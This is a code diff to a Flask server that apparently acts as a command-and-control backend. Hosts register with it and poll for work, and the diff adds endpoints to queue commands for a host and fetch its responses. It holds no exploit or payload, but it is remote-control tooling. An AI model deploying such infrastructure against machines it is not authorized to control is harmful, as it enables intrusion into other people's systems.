@@ -61,7 +61,7 @@ def getCommands(identifier):
 @app.route("/hosts/<identifier>/responses", methods=["POST"])
 def getResponse(identifier):
     """
-    Accepts a POST request for the client to send responses to
+    Accepts a POST request for the client to send responses to.
     """
     data = request.json
     data = json.loads(data,strict=False)
@@ -107,6 +107,23 @@ def newHost():
     TEAMS["unknown"].hosts.append(newHost)
     debugPrint(f'Unknown host ({IP} - {OS}) - {newHost.id}')
     return f"{newHost.id}"
+
+@app.route("/hosts/<identifier>/addCommand", methods=["POST"])
+def addCommand(identifier):
+    """
+    Takes in a POST request with a command and adds it to the host's queue.
+    """
+    data = request.json
+    print(data)
+    command = data["command"]
+    return HOSTS[identifier].addCommand(command) #Returns the command ID
+
+@app.route("/hosts/<identifier>/getResponses")
+def getResponses(identifier):
+    """
+    Returns a list of responses for the host.
+    """
+    return HOSTS[identifier].getResponses()
 
 def getInfoByIP(IP):
     """
